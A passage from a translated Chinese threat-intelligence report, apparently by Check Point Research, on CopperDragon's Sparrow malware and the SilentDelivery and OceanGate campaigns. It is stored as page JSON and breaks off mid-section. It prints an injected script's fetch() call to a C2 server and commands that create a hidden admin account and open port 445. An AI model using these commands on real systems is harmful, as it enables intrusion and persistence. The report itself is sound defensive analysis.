[{"_1":2,"_3":4},"root",{"_5":183},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":-5,"_41":-5,"_42":43,"_44":45,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":-5,"_57":37,"_58":59},"expiresAt",1794357646000,"id","yvzjhws6tdc6je8wptnrjsqgv","title","Check Point Research 追踪 CopperDragon 关联 Sparrow 框架的三个攻击集群","originalTitle","Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe","summary","Check Point Research 经一年调查识别出 SilentDelivery、OceanGate 和 DarkWire 三个关联 Sparrow 框架的攻击集群。","reason","报告以共享代码与基础设施串联三个活动集群，并披露跨平台后端、凭据窃取与隐蔽通信细节，便于拆分此前混归 FamousSparrow 的入侵活动。","source",{"_69":182},"links",{"_172":181},"publishedAt","2026-11-10T14:01:14.000Z","discoveredAt","2026-11-10T14:47:20.754Z","timelineAt","category","activity","tags",[72,70,176,177,178,179,82,180],"score",76,"selected",true,"channel","news","story","x","readingMode","full","author","matthewsu@checkpoint.com","body",{"_59":171,"_172":-5,"_173":174,"_175":37},"outline",[83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110],"relatedStories",[],"topics",[60,61,62,63,64,65,66],"indexable","markdownAvailable","group","hasTranslation","bodyLanguage","zh",{"_67":81,"_69":82},{"_67":79,"_69":80},{"_67":77,"_69":78},{"_67":75,"_69":76},{"_67":73,"_69":74},{"_67":71,"_69":72},{"_67":68,"_69":70},"slug","malware","name","恶意软件","attack","攻击活动","black-market","数据窃取与黑产","ransomware","勒索软件","email","邮件与钓鱼","identity","身份与访问","checkpoint","Check Point",{"_11":169,"_112":170,"_114":128},{"_11":167,"_112":168,"_114":128},{"_11":165,"_112":166,"_114":128},{"_11":163,"_112":164,"_114":128},{"_11":161,"_112":162,"_114":115},{"_11":159,"_112":160,"_114":115},{"_11":157,"_112":158,"_114":115},{"_11":155,"_112":156,"_114":115},{"_11":153,"_112":154,"_114":115},{"_11":151,"_112":152,"_114":128},{"_11":149,"_112":150,"_114":115},{"_11":147,"_112":148,"_114":115},{"_11":145,"_112":146,"_114":115},{"_11":143,"_112":144,"_114":115},{"_11":141,"_112":142,"_114":128},{"_11":139,"_112":140,"_114":115},{"_11":137,"_112":138,"_114":115},{"_11":135,"_112":136,"_114":115},{"_11":133,"_112":134,"_114":115},{"_11":131,"_112":132,"_114":128},{"_11":129,"_112":130,"_114":128},{"_11":126,"_112":127,"_114":128},{"_11":124,"_112":125,"_114":115},{"_11":122,"_112":123,"_114":115},{"_11":120,"_112":121,"_114":115},{"_11":118,"_112":119,"_114":115},{"_11":116,"_112":117,"_114":115},{"_11":111,"_112":113,"_114":115},"sec-28","text","DarkWire 活动基础设施","level",3,"sec-27","DarkWire 活动 文件","sec-26","OceanGate 活动 基础设施","sec-25","OceanGate Campaign 文件","sec-24","SilentDelivery Campaign 基础设施","sec-23","SilentDelivery Campaign 文件","sec-22","IOC",2,"sec-21","技术附录","sec-20","摘要","sec-19","DarkWire 归因","sec-18","DarkWire 基础设施","sec-17","执行与暂存","sec-16","CopperLoader","sec-15","DarkWire：入侵电信运营商","sec-14","Melofee","sec-13","内核级能力","sec-12","Windows 操作","sec-11","Linux 行动","sec-10","OceanGate：从 Linux 初始访问到域管理员","sec-9","SilentDelivery 基础设施","sec-8","在网络钓鱼攻击中使用 SquadC","sec-7","SquadC 后门","sec-6","JavaScript 分析","sec-5","受入侵网站","sec-4","SilentDelivery：选择性水坑攻击","sec-3","什么是 CopperDragon？","sec-2","引言","sec-1","要点","<h2 id=\"sec-1\">要点</h2><ul>\n<li>在为期一年的调查中，Check Point Research 发现了<strong>三个不同的行动集群</strong>，横跨<strong>拉丁美洲、亚洲和欧洲</strong>，攻击电信提供商、政府机构、军事实体、研究机构和关键基础设施。</li>\n\n\n\n<li>这些集群<strong>——SilentDelivery、OceanGate 和 DarkWire</strong>——通过共享的基础设施特征以及 <strong>Sparrow</strong> 恶意软件框架内的恶意软件代码相似性产生了关联。</li>\n\n\n\n<li>我们追踪了 <strong>Sparrow</strong> 框架背后的实体，即 <strong>CopperDragon</strong>，它可能是一名数字军需官，为与中国有关的威胁行为体提供支持，包括 <strong>FamousSparrow</strong>、<strong>Earth Estries</strong>、<strong>TropicTrooper</strong>、<strong>UAT-9244</strong> 等。</li>\n\n\n\n<li>每个集群都采用了不同的工具集和不同的初始访问技术，包括入侵面向互联网的基础设施，以及高度选择性的水坑攻击。用于水坑攻击的被入侵网站来自政府、航运、IT 和研究领域。</li>\n\n\n\n<li>我们的研究揭示了此前尚未记录的数种工具，以及有关 <strong>Sparrow</strong> 框架的新细节，包括 Windows 和 Linux 变体、<strong>被动后门能力</strong>，以及与 <strong>Melofee</strong> 后门的关联。</li>\n</ul><h2 id=\"sec-2\">引言</h2><p>过去一年中，Check Point Research 调查了一系列入侵活动，这些活动针对拉丁美洲、亚洲和欧洲的数十家高知名度机构。这些活动最初看起来是彼此独立的行动，各自使用不同的后门、漏洞利用后工具和行动节奏。</p><p>然而，我们发现了这些工具及其基础设施之间的诸多联系，将它们关联至同一个 <strong>Sparrow</strong> 恶意软件生态系统。我们追踪了这些活动背后的实体 <strong>CopperDragon</strong>，它可能充当数字军需官，为多个使用 <strong>Sparrow</strong> 跨平台恶意软件框架（适用于 Linux 和 Windows）的中国相关威胁行为体提供支持。</p><h2 id=\"sec-3\">什么是 CopperDragon？</h2><p><strong>FamousSparrow</strong> 是一个最早于 2021 年<a href=\"https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/\">被发现</a>的威胁行为体，其主要后门是 <strong>SparrowDoor</strong>。此后，多家安全厂商报道了相关活动和恶意软件变体，包括 <strong>CrowDoor</strong>、<strong>HemiGate</strong> 和 <strong>TernDoor</strong>。</p><p>随着时间推移，人们逐渐意识到，这些其他活动未必是由最初的 FamousSparrow 团伙实施。相反，报道显示有多个不同的行为体使用一套共享工具集，这些工具可能由同一实体提供。这些行为体包括 <strong>FamousSparrow</strong>、<strong>Earth Estries</strong>、<strong>TropicTrooper</strong>、<strong>UAT-9244</strong> 等。此前，FamousSparrow 也曾与 Salt Typhoon <a href=\"https://www.wsj.com/tech/cybersecurity/u-s-wiretap-systems-targeted-in-china-linked-hack-327fc63b\">建立联系</a>，但双方关系的具体细节仍不清楚。基于这些行为体之间明显的工具共享情况，我们开始追踪 <strong>Sparrow</strong> 框架背后的实体 <strong>CopperDragon</strong>，它可能是该框架的开发者和供应方。</p><p>在本报告中，我们考察了三个不同的活动集群，目标包括<strong>大型电信服务提供商</strong>、<strong>政府组织</strong>和<strong>军事实体</strong>。这些行动共同呈现了与<strong>CopperDragon</strong>相关联的互联互通且不断演化的间谍活动生态的更广泛视角：</p><ul>\n<li><strong>SilentDelivery</strong>使用高度选择性的水坑攻击，通过伪装成证书修复实用工具的木马化 MSI 安装程序分发<strong>SquadC</strong>后门。该集群主要聚焦欧洲和亚洲地区。</li>\n\n\n\n<li><strong>OceanGate</strong>主要针对亚洲组织，并使用<strong>SparrowDoor</strong>的一个变种。攻击者首先入侵面向互联网的 Linux 系统，随后横向移动至 Windows 环境，并针对这两种操作系统使用了一套广泛的后渗透工具。</li>\n\n\n\n<li><strong>DarkWire</strong>以拉丁美洲各地的电信服务提供商和政府组织为目标，主要使用<strong>CopperDoor</strong>和<strong>CopperDNS</strong>作为其后门。</li>\n</ul><figure><img width=\"1024\" height=\"500\" src=\"/dailyinfo/media/2255d87b8c9feba7.webp\" srcset=\"/dailyinfo/media/3e118eba030ef219.webp 720w, /dailyinfo/media/b2ab1eed639dff43.webp 1200w, /dailyinfo/media/2255d87b8c9feba7.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 1 – Sparrow 框架受害者的地理分布。</figcaption></figure><h2 id=\"sec-4\"><strong>SilentDelivery：选择性水坑攻击</strong></h2><p>自 2026 年初开始，我们开始追踪与<strong>CopperDragon</strong>相关的新活动，该活动引入了一种独特的初始访问方法，利用水坑攻击针对主要位于欧洲和亚洲的高知名度组织。我们将这一活动追踪为<strong>SilentDelivery</strong>行动。在我们完成本报告期间，该集群的一部分也由 Positive Technologies<a href=\"https://medium.com/@dzaripova1177/the-sparrow-that-chirped-too-loud-famoussparrow-attacks-using-updated-sparrowdoor-and-the-new-29ac2d90544d\">报告</a>。</p><figure><img width=\"1024\" height=\"410\" src=\"/dailyinfo/media/3be566734bdf738e.webp\" srcset=\"/dailyinfo/media/65405c7f0991deb3.webp 720w, /dailyinfo/media/74a60465347804ee.webp 1200w, /dailyinfo/media/3be566734bdf738e.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 2 – SilentDelivery 感染链。</figcaption></figure><p>攻击者首先入侵其预期目标经常访问的合法网站。当受害者访问其中某个网站时，一个经过重度混淆的 JavaScript 有效载荷会被注入页面，完全将原本合法的内容替换为一条根据网站语言定制的 Google Chrome SSL 证书警告。该虚假警告阻止用户访问网站，并指示用户安装“Certificate Fix”实用工具。该实用工具会部署一个此前未公开记录、名为<strong>SquadC</strong>的后门，或在某些情况下部署<strong>SparrowDoor</strong>的一个变种。</p><figure><img width=\"1165\" height=\"595\" src=\"/dailyinfo/media/275cd238617856c0.webp\" srcset=\"/dailyinfo/media/c499011737ef7aa8.webp 720w, /dailyinfo/media/4af2e683b20f6893.webp 1200w, /dailyinfo/media/275cd238617856c0.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 3 – 一个添加了“Install certificate”按钮的虚假 Chrome 证书错误页面。</figcaption></figure><h3 id=\"sec-5\">受入侵网站</h3><p>我们确认的所有受入侵网站都与政府、航运以及 IT 和研究领域有关。在一个案例中，该网站是通过对未经过滤的输入字段发起 XSS 攻击而被入侵的。根据 Check Point 遥测数据，这些行动主要针对捷克共和国、德国、法国、台湾、尼泊尔、香港和印度尼西亚等国家/地区的组织。</p><figure><img width=\"1024\" height=\"712\" src=\"/dailyinfo/media/7d8a9594175dc802.webp\" srcset=\"/dailyinfo/media/0bae9b69aff8f650.webp 720w, /dailyinfo/media/ced874e3161e8ac1.webp 1200w, /dailyinfo/media/7d8a9594175dc802.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"A newer version of Chrome’s certificate error appearing in different languages.\"><figcaption>图 4 – Chrome 新版证书错误以不同语言显示。</figcaption></figure><p>在所分析的网站中，我们还发现了三个据信被威胁行为者入侵的 S3 存储桶。这些存储桶托管了下一阶段的后门，当用户点击“Install certificate”按钮时便会下载该后门。</p><h3 id=\"sec-6\">JavaScript 分析</h3><p>注入受入侵网站的 JavaScript 使用<code>jsjiami</code>进行了重度混淆，这是一项公开可用的 JavaScript 混淆服务。它首先检查用户是否正在运行 Windows，并在某些情况下验证该网站的域名是否与预定的受入侵域名相匹配。</p><figure><img width=\"964\" height=\"232\" src=\"/dailyinfo/media/4f3b3535701942d8.webp\" srcset=\"/dailyinfo/media/1ac299be991db86d.webp 720w, /dailyinfo/media/b23a8d27bd79e12c.webp 1200w, /dailyinfo/media/4f3b3535701942d8.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"Deobfuscated JavaScript checking if the browser is a Windows host.\"><figcaption>图 5 – 解混淆后的 JavaScript，用于检查浏览器是否运行在 Windows 主机上。</figcaption></figure><p>随后，该脚本启动一个循环，不断向位于 <code>/image-check?t=&lt;datetime&gt;</code> 的 C2（命令与控制）服务器发送状态检查请求。这些请求用于根据 IP 和地理位置对用户进行指纹识别，并确定是否继续攻击和劫持网页。它们还使威胁行为者能够控制攻击，并在成功攻陷后停止显示虚假证书错误，从而降低引起用户怀疑的可能性。如果服务器返回 HTTP 200，网页将保持不变，用户可以正常访问该网站。如果服务器没有响应，脚本就会劫持网页并显示虚假证书错误。</p><p>当用户点击“Install certificate”时，脚本会向位于 <code>/report-url</code> 的 C2 服务器发送 POST 请求。该请求报告此次点击，并在其 JSON 正文中包含已攻陷网站的 URL。与此同时，脚本会启动从一个由攻击者控制的 S3 存储桶下载 MSI 包的进程，该包内含下一阶段的后门。</p><pre>fetch(serverUrl + \"/report-url\", {\n    method: \"POST\",\n    headers: {\n        \"Content-Type\": \"application/json\"\n    },\n    body: JSON.stringify({\n        url: window.location.href\n    })\n});</pre><p>用户执行后门后，后门会向位于 <code>/register-ip</code> 的 C2 服务器发送请求， indicating 攻陷成功。下次用户访问已攻陷网站时，不会再出现虚假证书错误。</p><figure><table><thead><tr><th>阶段</th><th>用户操作</th><th>报告</th></tr></thead><tbody><tr><td>1</td><td>访问已攻陷网站</td><td>JavaScript → <code>/image-check?t=&lt;datetime&gt;</code></td></tr><tr><td>2</td><td>点击“Install certificate”</td><td>JavaScript → <code>/report-url</code></td></tr><tr><td>3</td><td>执行后门</td><td>后门 → <code>/register-ip</code></td></tr></tbody></table></figure><h3 id=\"sec-7\">SquadC 后门</h3><p>SquadC 是一个用 C/C++ 编写的 Windows 后门，为操作人员提供对已攻陷主机的基本远程控制能力。该后门通过一个独立的加载器组件以内存方式加载，加载器通过三阶段流程对其进行解密和加载。SquadC 这一名称源自样本中作者留下的内部引用：</p><figure><img width=\"845\" height=\"110\" src=\"/dailyinfo/media/b16decedbbce57c4.webp\" srcset=\"/dailyinfo/media/64d41de5f58ccaf9.webp 720w, /dailyinfo/media/75d247e0e5a81644.webp 1200w, /dailyinfo/media/b16decedbbce57c4.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"Internal reference identifying the backdoor as SquadC.\"><figcaption>图 6 – 将该后门标识为 SquadC 的内部引用。</figcaption></figure><p>根据其配置，该后门支持多个标志，其中包括一个用于启用检查以避免在沙箱环境中执行的标志。这些检查会在文件系统和 Windows 注册表中查找 VM 痕迹，同时检查列入黑名单的 MAC 地址以及特定的屏幕分辨率和磁盘大小。</p><p>作为规避沙箱和自动化分析的额外措施，该后门可配置为仅在主机上当前有浏览器运行时才执行。由于后门是在感染期间通过浏览器下载的，因此预期浏览器会保持打开。该检查通过枚举正在运行的进程名称，并将其与一份固定的浏览器列表进行比对来完成：</p><pre>browser_list = [chrome.exe, msedge.exe, edge.exe, firefox.exe, brave.exe]</pre><p>为了在主机重启后继续存在，该后门通过操纵某个键下的注册表 Run 键来实现持久化：<code>WindowsUpdateAssist</code><strong>。</strong></p><p>该后门支持一小组用于命令执行和文件系统管理的命令，主要作为已攻陷主机上的初始立足点。</p><p><strong>SquadC</strong> 支持以下命令：</p><figure><table><thead><tr><th>命令 ID</th><th>说明</th><th>参数</th></tr></thead><tbody><tr><td><strong>0x2</strong></td><td>使用 <code>cmd /C dir \"&lt;path&gt;\"</code> 列出目录</td><td>directory</td></tr><tr><td><strong>0x3</strong></td><td>删除文件</td><td>filepath</td></tr><tr><td><strong>0x4</strong></td><td>将数据写入文件路径</td><td>filename, data</td></tr><tr><td><strong>0x5</strong></td><td>执行任意命令并返回输出</td><td>command</td></tr><tr><td><strong>0x6</strong></td><td>运行 <code>systeminfo</code></td><td></td></tr><tr><td><strong>0x7</strong></td><td>捕获全屏截图</td><td></td></tr><tr><td><strong>0x8</strong></td><td>状态检查</td><td></td></tr><tr><td><strong>0xA</strong></td><td>在后台执行任意命令</td><td>command</td></tr><tr><td><strong>Default</strong></td><td>返回 <code>unknown command</code></td><td></td></tr></tbody></table></figure><h3 id=\"sec-8\">在网络钓鱼攻击中使用 SquadC</h3><p>在搜寻相关文件时，我们发现了通过鱼叉式网络钓鱼分发 <strong>SquadC</strong> 的另一种方式。我们发现了一个名为 <code>Strategi_AS_Referensi_April2026.rar</code> 的压缩归档文件，该文件从印度尼西亚上传至 VirusTotal，这与在洒水洞活动中观察到的印度尼西亚组织相吻合。该后门被配置为与洒水洞感染链中使用的同一 IP 地址通信，表明这两项活动均与同一威胁行为者有关。</p><p>该归档文件包含四个文件：</p><ul>\n<li><strong>Strategi_AS_Referensi_April2026.docx.lnk</strong> – 一个滥用 <code>ftp.exe</code> LOLBin 执行命令的 LNK 文件。</li>\n\n\n\n<li><strong>_rels/info.dll</strong> – 一个使用 <code>ftp.exe</code> 执行的批处理脚本：</li>\n</ul><figure><img width=\"838\" height=\"205\" src=\"/dailyinfo/media/86c60bbdb0f1e9c0.webp\" srcset=\"/dailyinfo/media/faeb71801d6e1802.webp 720w, /dailyinfo/media/e01a295fbefd017e.webp 1200w, /dailyinfo/media/86c60bbdb0f1e9c0.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"info.dll file content\"><figcaption>图 7 – info.dll 文件内容。</figcaption></figure><ul>\n<li><strong>_rels/.rels.log</strong> – 一个包含 <strong>SquadC</strong> 加载器组件的 cab 文件：</li>\n</ul><figure><img width=\"1024\" height=\"122\" src=\"/dailyinfo/media/00051e372a804802.webp\" srcset=\"/dailyinfo/media/3e842afa3fdc98a4.webp 720w, /dailyinfo/media/ea0e384111821c96.webp 1200w, /dailyinfo/media/00051e372a804802.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 8 – .rels.log CAB 文件中的 SquadC 加载器组件。</figcaption></figure><ul>\n<li><strong>_rels/557.pdf</strong> – 一个空文件。</li>\n</ul><p>执行该 LNK 文件时，它会运行一系列 CMD 命令来提取并执行 <strong>SquadC</strong> 后门。它还会打开一个诱饵文档，在本例中该文档是一个空文件。</p><h3 id=\"sec-9\">SilentDelivery 基础设施</h3><p><strong>SilentDelivery</strong> 行动被归因于 <strong>CopperDragon</strong>，主要依据两项观察：</p><ul>\n<li>在某些情况下，最终有效载荷是 <strong>SparrowDoor</strong> 的一个变种。即使涉及 <strong>SquadC</strong>，用于加载后门的 DLL 此前也曾用于 <strong>FamousSparrow</strong> 工具集。</li>\n\n\n\n<li><strong>SquadC</strong> 的 C2 基础设施与关联 <strong>FamousSparrow</strong> 的基础设施具有多项共同特征，包括服务器布局、开放的服务和端口、HTTP 响应横幅以及重复使用的 TLS 证书。</li>\n</ul><pre>Subject: C=US ST=US L=Oregon O=VeriSign Class 3 Code Signing 2010 CA OU=VeriSign Class 3 Code Signing 2010 CA CN=VeriSign Trust Network Issuer: C=US ST=US L=Santa Clara O=McAfee, Inc. OU=McAfee, Inc. CN=McAfee, Inc. \nSerial Number: 0x4872589ca964eac0776b1e9617e9813cb1da49dc \nNot Before: 2023-04-28 11:13:39 \nNot After: 2024-04-27 11:13:39 \nFingerprint SHA-1: 760be920fad07881b8ce9d94e074a35b4f806717</pre><blockquote>\n<p>SilentDelivery 与 OceanGate C2 基础设施之间重复使用的 TLS 证书。</p>\n</blockquote><h2 id=\"sec-10\"><strong>OceanGate：从 Linux 初始访问到域管理员</strong></h2><p><strong>OceanGate</strong> 行动于 2025-2026 年被观察到，主要针对亚洲地区的政府组织和关键基础设施。在其他地区也发现了一些活动。该行动采用了较为常见的入侵模式，其工具和操作 TTPs（战术、技术与流程）与多家供应商此前报告并跟踪为 <strong>FamousSparrow</strong> 的活动一致。</p><p>在此次攻击中，威胁行为者在 Linux 和 Windows 环境中均开展活动，部署了多个此前未曾报告的工具，以维持访问权限并在已入侵网络中进行横向移动。该行动涉及大规模凭据窃取、横向移动、数据暂存以及敏感运营信息外泄。鉴于目前关于该行为者如何在此类环境中操作以及使用哪些工具的报道有限，其 Linux 活动尤为值得关注。</p><h3 id=\"sec-11\">Linux 行动</h3><p>入侵始于利用一台暴露在互联网且存在漏洞的 Linux 服务器，随后部署了两个新型后门：<strong>AnnobinDoor</strong> 和 <strong>SparrowShell</strong>。</p><figure><img width=\"1024\" height=\"479\" src=\"/dailyinfo/media/7268154a9341ff78.webp\" srcset=\"/dailyinfo/media/37b1e5d9875fc8c8.webp 720w, /dailyinfo/media/af2fbc4f08db36c2.webp 1200w, /dailyinfo/media/7268154a9341ff78.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 9 – OceanGate 集群：Linux 攻击链示意图。</figcaption></figure><p><strong>AnnobinDoor</strong></p><p>初始访问后部署的第一个后门是 <strong>AnnobinDoor</strong>，这是一个静态链接、基于 Go 的后门，使用 UPX 加壳，内部名称为 <code>annobinagent</code>。默认使用 WebSocket，但也支持 HTTP 和原始 TCP。其请求包含类浏览器标头和标准 WebSocket 升级字段，使流量看起来类似合法的应用通信。</p><p>该后门提供广泛的远程访问和枢转能力，包括交互式 shell、文件管理、SOCKS 代理、SSH 隧道、端口转发和反向连接。</p><p>这些功能结合在一起，使受感染的 Linux 主机能够同时充当远程 shell 和内部网络枢转点。</p><p><strong>SparrowShell</strong></p><p>攻击稍后，攻击者还部署了我们命名为 <strong>SparrowShell</strong> 的另一个后门。SparrowShell 是一个模块化 Linux 后门，与 Windows 后门 <strong>SparrowDoor</strong> 在设计和代码上有大量相似之处。两者属于同一个跨平台恶意软件家族，均有针对 Linux 和 Windows 开发的版本。它们共用相同的 C2 基础设施和 RC4 解密密钥，也具有相似的命令行参数和可比较的基于插件的架构。</p><p><strong>SparrowShell</strong> 支持以下命令：</p><figure><table><thead><tr><th>命令 ID</th><th>方向</th><th>说明</th></tr></thead><tbody><tr><td>0x1001</td><td>客户端 → C2</td><td>发送主机指纹（操作系统、IP、用户、主机名、时间戳、主机 ID）。等待魔术值 <code>0x11223344</code>，以确认连接并将 C2 标记为活动状态。</td></tr><tr><td>0x1002</td><td>客户端 <img src=\"/dailyinfo/media/34a85405407d20a0.webp\" loading=\"lazy\" decoding=\"async\" alt=\"↔\">︎ C2</td><td>向 C2 请求插件模块。接收加密数据块，进行解密，保存至 <code>/tmp/%x</code>，通过 <code>dlopen</code> 加载，执行 <code>xmain</code>，随后从磁盘中删除。</td></tr><tr><td>0x1003</td><td>客户端 → C2</td><td>发送额外的主机标识符/哈希。根据 C2 响应（<code>0x11223344</code>）验证连接；若无效，则断开连接。</td></tr><tr><td>0x1004</td><td>C2 → 客户端</td><td>向 C2 返回当前运行时配置（228 字节结构）。</td></tr><tr><td>0x1005</td><td>C2 → 客户端</td><td>接收新配置（228 字节），对其进行加密，并将其存储为 <code>&lt;executable&gt;_</code>，以在多次运行之间保持持久化。</td></tr><tr><td>0x1006</td><td>C2 → 客户端</td><td>移除持久化机制（cron/systemd），删除二进制文件和配置，清除临时文件，移除 iptables 规则，并终止执行。</td></tr><tr><td>0x1007</td><td>C2 → 客户端</td><td>在指定端口上打开本地 TCP 侦听器，并将传入连接桥接至 C2（端口转发）。</td></tr><tr><td>0x100A</td><td>C2 → 客户端</td><td>发送当前已加载插件系列及其元数据的序列化列表。</td></tr><tr><td>0x100B</td><td>C2 → 客户端</td><td>未检测到操作；可能保留供将来使用。</td></tr><tr><td>0x100C</td><td>C2 → 客户端</td><td>根据系列 ID 移除已加载的插件。</td></tr><tr><td>0x100D</td><td>C2 → 客户端</td><td>建立到目标/端口的出站连接，并将其桥接至 C2，从而实现反向隧道。</td></tr><tr><td>0x100E</td><td>C2 → 客户端</td><td>断开与 C2 的连接，并休眠指定的分钟数后重新连接。</td></tr></tbody></table></figure><p><strong>被植入木马程序的 SSH 工具</strong></p><p>几天后，威胁行为者将服务器上合法的 SSH 客户端和 SSHD 组件替换为被植入木马的版本，设计用于在管理活动期间记录凭据。这使攻击者能够收集多个用户的凭据，并转移到网络中的其他 Linux 主机，在那里再次使用了相同技术。</p><p><strong>公开工具</strong></p><p>除了自定义工具和脚本外，威胁行为者还使用了 popular 的公开可用工具，包括 <strong>FRPC</strong> 和 <strong>Chisel</strong>，这些工具为远程访问和内部横向移动提供了额外通道。该行为者还使用 <a href=\"https://github.com/iiilin/ASimplePortScanner/tree/master\"><strong>ASimplePortScanner</strong></a>，这是一款开源 Python 扫描器，用于发现网络中的其他主机。</p><h3 id=\"sec-12\">Windows 操作</h3><figure><img width=\"1024\" height=\"455\" src=\"/dailyinfo/media/2d167d9db1163a2d.webp\" srcset=\"/dailyinfo/media/14748ba0cafa8602.webp 720w, /dailyinfo/media/8073e985a1fef5e9.webp 1200w, /dailyinfo/media/2d167d9db1163a2d.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 10 – OceanGate：向 Windows 环境进行横向移动并部署工具。</figcaption></figure><p>从多个用户处收集凭据并在 Linux 环境中建立稳固据点后，该行为者转移到了 Windows 环境。</p><p>该行为者尝试通过 RDP 登录多台 Windows 机器，不断尝试不同的密码，直到使用管理员账户成功完成身份验证。随后，其部署了一组自定义后渗透工具，之后部署了最终的 Windows 后门——<strong>SparrowDoor</strong> 的一个变种。</p><p><strong>CopperAdu</strong></p><p><strong>CopperAdu</strong> 是一款后渗透工具，用于将已失陷的 Windows 主机配置为可远程管理，为攻击者后续活动做好准备。</p><p>它创建一个使用硬编码凭据的本地账户，禁用密码过期，并将该账户添加到本地 Administrators 组。它还会修改注册表，以在标准 Windows 登录界面中隐藏该账户。</p><p>该工具将 <code>LocalAccountTokenFilterPolicy</code> 设置为 <code>1</code>，使使用本地管理员账户建立的远程连接能够保留完整管理权限，并促进横向移动。</p><p>最后，CopperAdu 启用 <strong>LanmanServer</strong> 和 <strong>LanmanWorkstation</strong> 服务，并配置一条入站 Windows Firewall 规则，以允许 <strong>TCP 端口 445</strong> 上的 SMB 流量。</p><pre>net user admin$ \"Admin@123456\" /add /expires:never /passwordchg:no\nwmic useraccount where \"Name='admin$'\" set PasswordExpires=false\nnet localgroup administrators admin$ /add\nsc config LanmanServer start= auto\nsc start LanmanServer\nsc config LanmanWorkstation start= auto\nsc start LanmanWorkstation\nnetsh advfirewall firewall delete rule name = \"RasiUwpApp\"\nnetsh advfirewall firewall add rule name=\"RasiUwpApp\" dir=in action=allow protocol=TCP localport=445 profile=any</pre><p><strong>CopperList</strong></p><p>随后，该行为者部署了 <strong>CopperList,</strong> 这是一款 Windows 侦察工具，可收集主机信息、磁盘详细信息和递归文件清单，包括文件路径、大小和时间戳。它在扫描固定磁盘时会排除常见的系统和应用程序目录，重点关注用户数据及潜在的敏感文件。收集到的信息使用 <strong>LZNT1</strong> 压缩，并由攻击者部署的其他组件暂存以供数据外传。</p><figure><img width=\"802\" height=\"565\" src=\"/dailyinfo/media/d90ec82fe35c8e4c.webp\" srcset=\"/dailyinfo/media/1eedc5006690c920.webp 720w, /dailyinfo/media/51c6d222bb985f0c.webp 1200w, /dailyinfo/media/d90ec82fe35c8e4c.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"CopperList output on a test machine\"><figcaption>图 11 – 测试机器上的 CopperList 输出。</figcaption></figure><p><strong>CopperLogger</strong></p><p>在部分主机上，该行为者部署了 <strong>CopperLogger</strong>，这是一款基于 Raw Input 的键盘记录器。它注册一个隐藏窗口（<code>kbl</code>）并订阅键盘输入事件，从而能够捕获击键内容，无论当前焦点位于哪个应用程序。</p><p>除击键记录外，该恶意软件还会收集上下文信息，包括：</p><ul>\n<li>活动窗口标题</li>\n\n\n\n<li>关联的进程名称和路径</li>\n\n\n\n<li>用户会话上下文</li>\n</ul><p>此外，该恶意软件还会监控涉及复制和粘贴的剪贴板活动，并将其与击键数据一并存储。</p><p><strong>CopperLsa</strong></p><p>为在 Windows 系统上窃取凭据，该行为者部署了 <strong>CopperLsa</strong>，这是一款直接通过 Windows 身份验证流程收集凭据的工具。其加载器会解密两个嵌入的 DLL：一个在 LSASS 内部安装自定义 LSA 安全包，另一个则从多种身份验证机制（包括 NTLM 和 Kerberos）中收集密码、哈希和身份验证令牌。被窃取的凭据会保存至操作员选定位置的日志文件。</p><h3 id=\"sec-13\">内核级能力</h3><p>在某些情况下，我们观察到该行为体在其主要后门中添加了内核 rootkit 和内核级访问能力：适用于 Windows 的 <strong>SparrowDoor</strong> 以及适用于 Linux 的 <strong>SparrowShell</strong>。</p><p><strong>SparrowShell 内核 rootkit</strong></p><p>SparrowShell 支持与嵌入式内核 rootkit 集成。携带 <code>hide</code> 标志执行时，该后门会定位附加的加密数据块，对其进行解密，并使用 <code>init_module</code> 系统调用将其作为内核模块加载到内存中。</p><p>该内核组件是开源 Reptile rootkit 的修改版本，支持隐藏文件、进程和网络活动等功能。用户空间与 rootkit 之间的通信使用自定义 <code>ioctl</code> 接口，其 ID 为 